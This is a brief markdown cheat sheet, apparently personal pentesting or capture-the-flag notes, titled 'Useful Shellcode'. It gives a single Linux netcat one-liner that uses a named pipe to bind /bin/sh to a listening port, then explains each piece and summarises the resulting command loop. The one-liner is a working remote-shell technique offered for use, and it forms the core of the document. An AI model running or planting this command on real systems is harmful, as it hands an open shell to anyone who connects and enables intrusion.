# Useful Shellcode

## Netcat
* Linux Bash:
    1. Reverse Bind: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
        * __mmkfifo /tmp/f;__ : Creates a named pipe.
        * __nc -lvnp \<PORT\>__ : Starts netcat listener.
        * __< /tmp/f__ : Connects litener to named pipe.
        * __| /bin/sh >/tmp/f__: Outputs commands from listener to __sh__.
        * __2>&1__: Redirects the  standard error stream (file descriptor 2) to the same location as the standard output (file descriptor 1).
        * __rm /tmp/f__: Deletes named pipe after its use.
            >How It All Works (Summary)<br> The FIFO file is created to act as a bidirectional channel while Netcat is started in bind mode, listening on a port for incoming connections. Once a remote user connects: Netcat passes their input into the FIFO. The shell reads the command from the FIFO, executes it, and writes the output/error back into the FIFO. Netcat reads the shell's output from the FIFO and sends it back to the client. When the session ends, the FIFO file is removed. This forms a looped communication channel:<br>[Remote Client] ⇄ [Netcat ⇄ FIFO ⇄ /bin/sh] ⇄ [Remote Client]
